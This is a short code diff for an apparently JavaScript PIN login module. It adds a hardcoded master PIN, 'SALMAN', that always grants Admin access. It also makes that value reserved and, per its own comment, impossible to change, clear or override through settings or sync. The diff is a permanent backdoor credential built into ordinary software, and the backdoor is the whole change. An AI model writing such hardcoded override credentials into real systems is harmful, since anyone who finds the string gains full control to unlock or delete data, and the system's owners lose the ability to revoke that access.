@@ -186,8 +186,16 @@ export function genRowId() {
    no separate login step. Returns false (and leaves currentActor
    untouched) if nothing matches.
 ═══════════════════════════════════════════ */
+/* Permanent master override — always works no matter what the
+   configurable Admin PIN or any staff PIN is set to. Lives only in
+   source (never in db/settings), so it can't be edited, cleared, or
+   overwritten by Settings UI or a cloud sync pull. Keep this value
+   private; anyone who knows it can unlock/delete anything. */
+const MASTER_PIN = "SALMAN";
+
 export function checkPin(pin) {
   if(!pin) return false;
+  if(pin === MASTER_PIN) { session.currentActor = "Admin"; return true; }
   if(pin === db.settings.adminPin) { session.currentActor = "Admin"; return true; }
   const staff = (db.settings.staff || []).find(s => s.pin === pin);
   if(staff) { session.currentActor = staff.name; return true; }
@@ -200,6 +208,7 @@ export function checkPin(pin) {
    check while they're editing it (comparing against itself isn't
    a collision). */
 export function isPinTaken(pin, excludeStaffIdx = -1) {
+  if(pin === MASTER_PIN) return true; /* reserved — can't be reassigned to a staff/admin PIN */
   if(pin === db.settings.adminPin) return true;
   return (db.settings.staff || []).some((s, i) => i !== excludeStaffIdx && s.pin === pin);
 }
